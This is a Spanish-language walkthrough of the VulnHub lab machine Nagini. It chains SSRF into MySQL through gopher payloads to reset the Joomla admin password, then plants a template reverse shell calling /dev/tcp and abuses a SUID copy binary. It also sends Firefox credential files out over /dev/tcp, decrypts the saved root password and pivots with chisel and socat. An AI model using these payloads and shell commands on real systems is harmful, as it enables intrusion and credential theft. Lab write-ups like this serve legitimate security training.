
---
# Guía paso a paso de explotación:

## Información general

- **Nombre**: Nagini
- **Plataforma**: VulnHub
- **Descarga**:  [Nagini](https://www.vulnhub.com/entry/harrypotter-nagini,689/)  
- **Nivel**: Media
- **IP**:  [Configuración de entorno](./Configuración%20de%20entorno.md)
- **Objetivo**: Obtener acceso root para pivotar por las diferentes redes del sistema


---

## Reconocimiento


Acción:

```bash
seq 1 65535 | xargs -P 500 -I {} proxychains nmap -p{} --open -sT -n -Pn -v --min-rate 5000 10.10.0.129 2>&1 | grep "tcp open" 
```

Resultado:

```bash
22/tcp open  ssh
80/tcp open  http
```

**Nota:** podemos hacer seguimiento de por qué puerto va el escaneo de la siguiente manera

```bash
ps -faux  | grep nmap | tail -n2 | head -n1
metahumo  446795  0.0  0.0  29444  1268 pts/4    R+   19:59   0:00  |   |   \_ nmap -p17390 --open -sT -n -Pn -v --min-rate 5000 192.168.100.132
```

Explicación: se lanza un escaneo de puertos masivo y paralelo usando `seq` + `xargs -P 500` para iterar rápidamente por todos los puertos (1–65535) en 500 tareas concurrentes. Cada tarea ejecuta `nmap` para un único puerto (`-p{}`), pasando la conexión por `proxychains` porque el acceso a la red objetivo se realiza a través de un túnel (Aragog → Nagini).  

Opciones claves de `nmap` usadas: `--open` (solo mostrar puertos abiertos), `-sT` (TCP connect scan), `-n` (no DNS), `-Pn` (no ping previo), `-v` (verbose) y `--min-rate 5000` (velocidad mínima de paquetes para acelerar). La salida se filtra con `grep "tcp open"` para listar únicamente los puertos abiertos encontrados.  El resultado indica que los servicios accesibles desde el túnel son SSH (puerto 22) y HTTP (puerto 80).

### Fuzzing

Para poder acceder desde el navegador al host objetivo mediante el túnel de proxychains, tenemos que configurar el `foxyproxy` para que apunte a la dirección `127.0.0.1` por el puerto `1080`

[Ver instalación de Foxy-Proxy](../../Herramientas/Burp%20Suite/BurpSuite.md)

![captura](./Imágenes/proxy_1.png)  

![captura](./Imágenes/proxy_2.png)  

Acción:

```bash
gobuster dir -u http://10.10.0.129/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt,html --proxy socks5:/127.0.0.1:1080
```

Resultado:

```bash
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/joomla               (Status: 301) [Size: 311] [--> http://10.10.0.129/joomla/]
/server-status        (Status: 403) [Size: 276]
/note.txt             (Status: 200) [Size: 234]
```

Explicación: para la búsqueda de directorios y archivos ocultos usamos gobuster con el parámetro `--proxy`. El resultado es un endpoint `/joomla/` lo cual indica que el CMS de la web es un Joomla

[Ver gestor de contenido Joomla](../../Gestores%20de%20contenido%20(CMS)/Joomla)

![captura](./Imágenes/web_2.png)  

Vemos que existe un archivo `note.txt` con el siguiente contenido:

```bash
Hello developers!!


I will be using our new HTTP3 Server at https://quic.nagini.hogwarts for further communications.
All developers are requested to visit the server regularly for checking latest announcements.


Regards,
site_amdin
```

**Importante:** este mensaje indica que la comunicación ya no se hará por HTTP clásico sino por **HTTP/3**, que funciona sobre **QUIC (UDP/443)** en lugar de TCP. Para interactuar con ese servidor necesitarás herramientas que soporten HTTP/3/QUIC (por ejemplo `curl --http3`, navegadores modernos como Chrome/Firefox, o librerías específicas)

Acción: volvemos a lanzar el cliente de chisel desde Aragog

```bash
./chisel client 192.168.1.66:1234 R:socks R:443:10.10.0.129:443/udp
```

Para poder gestionar de forma óptima las conexiones HTTP3 vamos a usar el recurso de `quiche`

[Ver instalación Quiche](../../Herramientas/Quiche/quiche_PoC.md)

Acción:

```bash
./http3-client https://127.0.0.1
```

Explicación: con este comando deberíamos de ver el contenido del endpoint. Pero debido a actualizaciones del repositorio `quiche` actualmente no realiza un `GET` que permita mostrarnos esa información. Aquí tenemos la opción de clonarnos un repositorio antiguo (release 0.16.0) de `quiche` que si incluya esta opción. 

### Ralease antiguo de quiche

Para poder usar una versión anterior de quiche que si tramita solicitudes por `GET` en sus script proporcionados, tenemos que clonarnos el repositorio con la versión correspondiente. 

Acción:

```bash
git clone https://github.com/cloudflare/quiche.git
cd quiche
git checkout 0.16.0
```

Explicación: con esto tenemos la versión `0.16.0` 

Acción:

```bash
cargo build --examples
```

Resultado: nos arrojará errores por falta de librerías. Para solucionar esto justo después de usar `cargo build --examples` ejecutamos el siguiente comando

```bash
git submodule update --init --recursive
cargo build --examples
```

Explicaicón: con `git submodule update --init --recursive` instalaremos lo necesario y ya podremos terminar la instalación

Acción:

```bash
./target/debug/examples/http3-client https://127.0.0.1:443/
```

Resultado:

```bash
<html>
	<head>
	<title>Information Page</title>
	</head>
	<body>
		Greetings Developers!!
		
		I am having two announcements that I need to share with you:

		1. We no longer require functionality at /internalResourceFeTcher.php in our main production servers.So I will be removing the same by this week.
		2. All developers are requested not to put any configuration's backup file (.bak) in main production servers as they are readable by every one.


		Regards,
		site_admin
	</body>
</html>
```

Explicación: conseguimos obtener conexión vía http3, recibiendo un mensaje que nos indica un endpoint que debemos comprobar `/internalResourceFeTcher.php`

![captura](./Imágenes/web_3.png)  

Código fuente:

```html
<html>
<head>
	<title>Resource Fetching Page</title>
	<meta charset="utf-8">
</head>
<body>
	<center><h1>Welcome to Internal Network Resource Fetching Page</h1></center>
	<br><br>

	<form action="/internalResourceFeTcher.php" method="GET">
	<center><input type="text" name="url" value="" id='url'>
	<input type="submit" value="Fetch"></center>
	</form>
</body>

<html>
<body>
<img src="harry_potter_2.jpg" style='height: 100%; width: 100%; '>
</body>
</html>
```

Acción: como en su código fuente tiene el parámetro `id='url'` podemos tratar de hacer una solicitud al nuestro localhost por el buscador que debería de devolvernos el recurso solicitado.

Resultado:

![captura](./Imágenes/web_4.png)  

Explicación: al probar con el dominio de la máquina Aragog sucede lo mismo solo que no carga la imagen ya que trata de usar recursos internos para ello. La confirmación esta en el SSRF

> Es un **SSRF** porque la aplicación permite que un usuario controle el parámetro `url` en `/internalResourceFeTcher.php`, provocando que el servidor haga solicitudes a **cualquier recurso interno o externo** en nombre del atacante, sin validación.  En otras palabras, podemos usar la página para que el servidor acceda a direcciones internas (localhost, intranet, etc.), lo que confirma la vulnerabilidad

[Ver qué es un SSRF](../../OWASP%20TOP%2010/SSRF/)

Acción:

```bash
wget https://github.com/andrew-d/static-binaries/raw/refs/heads/master/binaries/linux/x86_64/socat
scp socat root@192.168.1.82:/tmp/socat
```

Explicación: nos descargamos el binario de `socat` y nos lo transferimos a la máquina objetivo Aragog

Acción: desde Aragog ejecutamos `socat`

```bash
./socat TCP-LISTEN:4343,fork TCP:192.168.1.66:80
```

Acción: desde máquina atacante

```bash
nano pwned.php
```

```php
<?php
	system("whoami");
?>
```

Explicación: tratamos de confirmar que podemos derivar el SSFR a un RCE pero al cargar este archivo desde el buscador, habiéndolo compartido antes con python, vemos que el código no llega ejecutarse y en el código fuente queda reflejado como comentario. Por lo que descartamos que la intrusión vaya por este enlace. Y retomamos la información que vimos por http3, donde apuntaba que podría haber archivo `.bak` con información sensible

Acción: usamos `joomscan` para enumerar correctamente la web

[Ver cómo usar joomscan](../../Gestores%20de%20contenido%20(CMS)/Joomla/Joomscan.md)

```bash
proxychains perl joomscan.pl -u http://10.10.0.129/joomla/ 2>/dev/null
```

Resultado:

```bash
Processing http://10.10.0.129/joomla/ ...
[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 3.9.25

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking Directory Listing
[++] directory has directory listing : 
http://10.10.0.129/joomla/administrator/components
http://10.10.0.129/joomla/administrator/modules
http://10.10.0.129/joomla/administrator/templates
http://10.10.0.129/joomla/tmp
http://10.10.0.129/joomla/images/banners


[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://10.10.0.129/joomla/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://10.10.0.129/joomla/robots.txt 

Interesting path found from robots.txt
http://10.10.0.129/joomla/joomla/administrator/
http://10.10.0.129/joomla/administrator/
http://10.10.0.129/joomla/bin/
http://10.10.0.129/joomla/cache/
http://10.10.0.129/joomla/cli/
http://10.10.0.129/joomla/components/
http://10.10.0.129/joomla/includes/
http://10.10.0.129/joomla/installation/
http://10.10.0.129/joomla/language/
http://10.10.0.129/joomla/layouts/
http://10.10.0.129/joomla/libraries/
http://10.10.0.129/joomla/logs/
http://10.10.0.129/joomla/modules/
http://10.10.0.129/joomla/plugins/
http://10.10.0.129/joomla/tmp/


[+] Finding common backup files name
[++] Backup files are not found

[+] Finding common log files name
[++] error log is not found

[+] Checking sensitive config.php.x file
[++] Readable config file is found 
 config file path : http://10.10.0.129/joomla/configuration.php.bak

Your Report : reports/10.10.0.129/
```

Explicación: exactamente encontramos lo que buscábamos, ya que tenemos este endpoint con un archivo .bak `http://10.10.0.129/joomla/configuration.php.bak`

Acción:

```bash
proxychains wget http://10.10.0.129/joomla/configuration.php.bak
cat configuration.php.bak
```

Resultado: parte del código php encontrado

```php
	public $dbtype = 'mysqli';
	public $host = 'localhost';
	public $user = 'goblin';
	public $password = '';
	public $db = 'joomla';
	public $dbprefix = 'joomla_';
	public $live_site = '';
	public $secret = 'ILhwP6HTYKcN7qMh';
```

Explicación: hemos encontrado una base de datos activa, con un usuario `goblin` que no tiene contraseña

Acción:

```bash
python3 -m venv venv
source venv/bin/activate
pip3 install git+https://github.com/Esonhugh/Gopherus3.git
gopherus3
```

> Gopherus es una herramienta que **convierte un SSRF en un “tubo” para enviar bytes arbitrarios a servicios TCP internos** usando la URL `gopher://…`.  En la práctica se usa para _fingerprinting_ y enumeración: desde el SSRF puedes inyectar comandos/protocolos crudos hacia servicios internos (p. ej. Redis, memcached, Elasticsearch, API administrativas, SMTP, etc.) y leer la respuesta, lo que revela la presencia/versionado de bases de datos y otros servicios.  No es un escáner HTTP normal: permite enviar tráficos del nivel de aplicación/registro (raw TCP) que muchos servicios exponen internamente y que los cortafuegos no dejan salir.  


Resultado:

```bash
       ________              .__                                ________  
     /  _____/  ____ ______ |  |__   ___________ __ __  ______ \_____  \ 
    /   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/   _(__  < 
    \    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \   /       \
     \______  /\____/|   __/|___|  /\___  >__|  |____//____  > /______  /
            \/       |__|        \/     \/                 \/         \/ 

  
usage: gopherus3
                 [--exploit {dmpmemcache,fastcgi,mysql,phpmemcache,plaintext,postgresql,pymemcache,rbmemcache,redis,smtp,zabbix}]
                 [--host HOST] [--port PORT] [-v] [--dump] [--slient]
                 [--post {line-n,line-rn,end-with-00}]

options:
  --exploit {dmpmemcache,fastcgi,mysql,phpmemcache,plaintext,postgresql,pymemcache,rbmemcache,redis,smtp,zabbix}
                        exploit type
  --host HOST           gopher host
  --port PORT           gopher port
  -v, --verbose         verbose mode
  --dump                dump generator status
  --slient              slient mode, stdout will only contain url
  --post {line-n,line-rn,end-with-00}
                        post processor type: line-n is \n line-rn is end-with-00 is
                        auto append 00 at End
```

Explicación: para más información ver [Gopherus3](https://github.com/Esonhugh/Gopherus3)

Acción:

```bash
gopherus3 --exploit mysql
```

Resultado:

```bash
Give query to execute: SHOW databases;
Give MySQL username: goblin

Your gopher link is ready to do SSRF: 

gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%10%00%00%00%03%53%48%4f%57%20%64%61%74%61%62%61%73%65%73%3b%01%00%00%00%01

-----------Made-by-Skyworship-----------
```

Explicación: ejecutamos la herramienta y nos pide una acción a ejecutar que es `SHOW databases;` y un nombre de usuario que es `goblin`. Lo que nos proporciona es una url para SSRF que nos dice que solo es posible usar cuando el usuario no requiere contraseña, que es nuestro caso

Acción: introducimos la url proporcionada por gopherus3 en el buscador vulnerable a SSRF ene el endpoint `/internalResourceFeTcher.php`

```bash
gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%10%00%00%00%03%53%48%4f%57%20%64%61%74%61%62%61%73%65%73%3b%01%00%00%00%01
```

Resultado:

```bash
 c 5.5.5-10.3.27-MariaDB-0+deb10u1)nWHDZyqL��-��hHlhGeK%r5Ppmysql_native_passwordKdefinformation_schemaSCHEMATASCHEMATADatabaseSCHEMA_NAME!��information_schemajoomla�"
```

![captura](./Imágenes/web_5.png)  

**Importante:** una vez enviada la 'Fetch' tenemos que recargar varias veces la página `ctrl+r` para que se refresca la información y nos muestre como vemos las bases de datos: `information_schema` y `joomla`. 

Explicación: con esta información y este procedimiento podemos ir enumerando la base de datos hasta dar con usuarios y contraseñas

Acciones a ejecutar en gopherus3:

```bash
SHOW databases;
USE joomla; SHOW tables;
USE joomla; describe joomla_users;
USE joomla; select name,username,email,password from joomla_users;
```

Resultado:

```bash
site_adminsite_admin@nagini.hogwarts<$2y$10$cmQ.akn2au104AhR4.YJBOC5W13gyV21D/bkoTmbWWqFWjzEW7vay"
```

Explicación: tenemos un posible usuario admin `site_admin` y una contraseña `$2y$10$cmQ.akn2au104AhR4.YJBOC5W13gyV21D/bkoTmbWWqFWjzEW7vay` que podemos tratar de descifrar (aunque no va a dar resultado en esta ocasión)

**¿Qué podemos hacer entonces?**

Con el SSRF podemos hacer más cosas, ya que algo que podemos realizar es modificar datos en la base de datos

Acción:

```bash
echo -n "password123" | md5sum
```

Resultado:

```bash
482c811da5d5b4bc6d497ffa98491e38
```

Explicación: creamos un hash en md5sum para actualizar la contraseña del usuario `site_admin` al hash `password123`

Acción: desde gopherus3

```bash
USE joomla; update joomla_users set password='482c811da5d5b4bc6d497ffa98491e38' where username='site_admin';
```

URL SSRF:

```bash
gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%6d%00%00%00%03%55%53%45%20%6a%6f%6f%6d%6c%61%3b%20%75%70%64%61%74%65%20%6a%6f%6f%6d%6c%61%5f%75%73%65%72%73%20%73%65%74%20%70%61%73%73%77%6f%72%64%3d%27%34%38%32%63%38%31%31%64%61%35%64%35%62%34%62%63%36%64%34%39%37%66%66%61%39%38%34%39%31%65%33%38%27%20%77%68%65%72%65%20%75%73%65%72%6e%61%6d%65%3d%27%73%69%74%65%5f%61%64%6d%69%6e%27%3b%01%00%00%00%01
```

Resultado:

```html
c 5.5.5-10.3.27-MariaDB-0+deb10u1AU[H7xyvd��-��s7V*miE]'EePmysql_native_password @ joomla0(Rows matched: 1 Changed: 0 Warnings: 0
```

Explicación: contraseña cambiada con éxito

Acción: nos dirigimos al endpoint que nos proporciono joomscan que es un panel de login administrativo

```url
http://10.10.0.129/joomla/administrator/
```

![captura](./Imágenes/web_6.png)  

![captura](./Imágenes/web_7.png)  

Explicación: logramos acceder como usuario administrador al panel de administración del servicio web objetivo

Acción: para vulnerar un Joomla, lo que se suele hacer es editar un archivo `.php` del apartado  `extensiones->templates->templates`. Añadimos dentro del archivo una reverse shell, y cuando se ejecute algún error (ya que modificamos el archivo de `error.php`) recibiremos una shell

```php
system("bash -c 'bash -i >& /dev/tcp/10.10.0.128/1234 0>&1'");
```

![captura](./Imágenes/web_8.png)  

![captura](./Imágenes/web_9.png)  

Acción: 

```bash
nc -lvnp 443
```

**Importante:** para que esto funcione, debido al pivoting, necesitamos usar `socat` desde la máquina Aragog, para que todo el tráfico que llegue a él sea redirigido a nuestra máquina atacante

Acción: en Aragog

```bash
./socat TCP-LISTEN:1234,fork TCP:192.168.1.66:443
```

Acción: forzamos un error para recibir la shell

```url
http://10.10.0.129/joomla/index.php/<>
```

Resultado:

```bash
[sudo] contraseña para metahumo: 
listening on [any] 443 ...
connect to [192.168.1.66] from (UNKNOWN) [192.168.1.82] 40818
bash: cannot set terminal process group (732): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Nagini:/var/www/html/joomla$ whoami
```

Explicación: hemos logrado vulnerar al sistema obteniendo una shell remota del sistema en nuestra máquina atacante


---

## Post Explotación


Acción:

```bash
hostname -I
cd /home
ls
cd snape/
ls -la
cat .creds.txt 
echo TG92ZUBsaWxseQ== | base64 -d; echo
su snape
```

Resultado:

```bash
192.168.100.128 10.10.0.129 
hermoine  snape
-rw-r--r-- 1 snape snape   17 Apr  4  2021 .creds.txt
drwx------ 2 snape snape 4096 Sep 27 04:53 .ssh
TG92ZUBsaWxseQ==
Love@lilly
Password: <Love@lilly>
snape@Nagini:~$ 
```

Explicación: comprobamos las direcciones IP de la máquina, vemos que tiene conexión dentro del rango de red de Aragog, pero también esta dentro del rango de otras redes, lo cual va a ser nuestra puerta de entrada a un nuevo pivotaje. Además, vemos el directorio `/home` con dos usuarios, de los cuales `snape` tiene un archivo oculto con su credencial en base64. Usando la contraseña encontrada accedemos al usuario `snape`

Acción:

```bash
cd /home/hermoine/bin/
ls -la
./su_cp --help
```

Resultado:

```bash
-rwsr-xr-x 1 hermoine hermoine  146880 Apr  4  2021 su_cp
Usage: ./su_cp [OPTION]... [-T] SOURCE DEST
  or:  ./su_cp [OPTION]... SOURCE... DIRECTORY
  or:  ./su_cp [OPTION]... -t DIRECTORY SOURCE...
Copy SOURCE to DEST, or multiple SOURCE(s) to DIRECTORY.
```

Explicación: acudiendo a la ruta del otro usuario `hermoine` vemos que tiene un ejecutable `su_cp` al ejecutarlo vemos que es un script que actúa como el comando `cp` de Linux que sirve para hacer copias. Como tiene permisos SUID, podemos hacernos una copia de su clave de ssh y ganar acceso a su usuario

Acción:

```bash
cat ~/.ssh/id_rsa.pub | tr -d '\n' | xclip -sel clip    # Máquina atacante
nano /tmp/authorized_keys    # Máquina Nagini
./su_cp /tmp/authorized_keys /home/hermoine/.ssh//authorized_keys
```

Explicación: copiamos a la clipboard nuestra clave pública, la pegamos en un archivo `authorized_keys` que almacenamos en una ruta temporal, para luego ejecutar el script con permisos SUID, que nos copie nuestra clave de ssh en el directorio `.ssh` del usuario `hermoine`

Acción:

```bash
proxychains ssh hermoine@10.10.0.129
```

Resultado:

```bash
hermoine@Nagini:~$ 
```

Explicación: aprovechando de un archivo SUID hemos pivotado a un nuevo usuario, ahora lo ideal es tomar el control de root


---

### Elevación de privilegios

Acción:

```bash
cd ./mozilla/firefox
ls
```

Resultado:

```bash
'Crash Reports'   g2mhbq0o.default   profiles.ini
'Pending Pings'   installs.in
```

Explicación: 

Acción:

```bash
cd g2mhbq0o.default
ls
```

Resultado:

```bash
key4.db
logins.json
```

Explicación: en el directorio de `hermoine` tenemos un directorio oculto `.mozilla` en el que se encuentra un perfil de usuario, que almacena contraseñas que podemos ver en el archivo `logins.json`. Para poder crackear estas credenciales usaremos la herramienta `firepwd`

Acción:

```bash
git clone https://github.com/lclevy/firepwd
cd firepwd
python3 -m venv venv
source venv/bin/activate
pip3 install -r requirements.txt
python3 -m pip install pycryptodome
python3 firepwd.py
```

Resultado:

```bash
Usage: firepwd.py [options]

Options:
  -h, --help            show this help message and exit
  -v VERBOSE, --verbose=VERBOSE
                        verbose level
  -p MASTERPASSWORD, --password=MASTERPASSWORD
                        masterPassword
  -d DIRECTORY, --dir=DIRECTORY
                        directory
```

Explicación: con esta herramienta instalada en nuestra máquina atacante, solo tenemos que traernos el archivo `key4.db` y el archivo `logins.json` y pasárselo como argumento al script

Acción: desde máquina atacante

```bash
nc -lvnp 1215 > logins.json
```

Acción: desde Nagini, como `hermoine`

```bash
cat < logins.json > /dev/tcp/10.10.0.128/5050
```

Acción: desde Aragog (podemos cerrar el Socat anterior ya que tenemos acceso vía ssh)

```bash
./socat TCP-LISTEN:5050,fork TCP:192.168.1.66:1215
```

Explicación:  forma de transferir archivos a través de `cat`. Repetimos la acción pero con el archivo `key4.db`

Acción:

```bash
python3 firepwd.py
```

Resultado:

```bash
decrypting login/password pairs
http://nagini.hogwarts:b'root',b'@Alohomora#123'
```

Explicación: 

Acción:

```bash
su root
```

Resultado:

```bash
Paasword: <@Alohomora#123>
```

Explicación: elevamos privilegios como usuario root. Ahora estableceremos persistencia y trataremos de pivotar hacia la siguiente máquina


---

### Persistencia

Acción:

```bash
cd /root/.ssh
nano authorized_keys
exit
proxychains ssh root@10.10.0.129
```

**Nota:** desde la máquina atacante generamos un par de claves pública y privada para poder copiar en el directorio `/roor/.ssh/` y ganar persistencia a la máquina objetivo. Para ello en la máquina atacante ejecutamos `ssh-keygen` y le damos a `Enter` tres veces (las que pide) para generar las claves, no hay que escribir nada, solo ejecutar `cat ~/.ssh/id_rsa.pub | tr -d '\n' | xclip -sel clip` para copiar en la clipboard la contraseña pública y poder pegarla en la máquina objetivo en un archivo llamado `authorized_keys` y guardado en la ruta `/root/.ssh/`

Explicación: generamos una clave ssh que almacenamos en la raíz del sistema root, para poder conectarnos sin otorgar contraseña cuando queramos a la máquina objetivo



---

## Pivoting

Acción:

```bash
hostname -I
```

Resultado:

```bash
192.168.100.128 10.10.0.129
```

Explicación: como hay dos segmentos de red, vamos a repetir el proceso que hicimos con Aragog

Acción:

```bash
nano hostDiscovery.sh
chmod +x hostDiscovery.sh
./hostDiscovery.sh
```

Resultado:

```bash
[+] Host 192.168.100.1 - ACTIVO
[+] Host 192.168.100.128 - ACTIVO
[+] Host 192.168.100.129 - ACTIVO
[+] Host 192.168.100.132 - ACTIVO
```

**Nota:** modificamos el script para que el host apunte a la dirección indicada

```bash
#!/bin/bash

for i in $(seq 1 254); do
  timeout 1 bash -c "ping -c 1 192.168.100.$i" &>/dev/null && echo "[+] Host 192.168.100.$i - ACTIVO" &
done; wait
```

Explicación: hemos encontrado un host activo con el que la máquina Nagini tiene comunicación `192.168.100.129` hay otra en la `.132` pero vamos a empezar a pivotar por la máquina Fawkes (realmente Fawkes no tiene más conectividad con otras máquinas, el camino correcto sería vulnerar la Matrix 1 y de ahí seguir pivotando, pero a modo de Prueba de Concepto (PoC) vamos a mostrar su tunelización y explotación)

### Tunneling

Acción: desde la máquina atacante nos transferimos a Nagini el chisel

```bash
proxychains scp chisel root@10.10.0.129:/root/chisel
chmod +x chisel   # desde Nagini
```

Acción: en Aragog, abrimos un túnel Socat con el que pasaremos a la máquina atacante todo el tráfico que llegue a Aragog (en este caso tráfico que llegará dese Nagini)

```bash
./socat TCP-LISTEN:2322,fork TCP:192.168.1.66:1234
```

Acción: desde Nagini abrimos un túnel hacia Aragog, donde usando Socat conectaremos con la máquina atacante, así podemos comunicar desde máquina atacante a Aragog desde aquí a Nagini y así llegar a Fawkes

```bash
./chisel client 10.10.0.128:2322 R:8888:socks
```

Explicación: hemos creado una tunelización que nos va a permitir obtener comunicación entre la máquina atacante y Fawkes

**Nota:** ahora mismo tendríamos en total 2 Socat y dos chisel activos, cada vez que requerimos abrir un nuevo Socat o chisel, abrimos una nueva conexión en un nuevo terminal para obtener conexión vía ssh y ejecutar los comandos mencionados

Acción:

```bash
nano /etc/proxychains.conf
```

Resultado:

```bash
dynamic_chain
#strict_chain
socks5 127.0.0.1 8888
socks5 127.0.0.1 1080

```

Explicación: actualizamos nuestro archivo de configuración de proxychains en la máquina atacante. Descomentamos `dynamic_chain` y comentamos `strict_chain` para habilitar y deshabilitar respectivamente, también añadimos, poniendo arriba siempre el último túnel añadido, la dirección del nuevo túnel creado 

[Ver Fawkes explotación](./Fawkes%20explotación.md)

![captura](./Imágenes/web_10.png)  
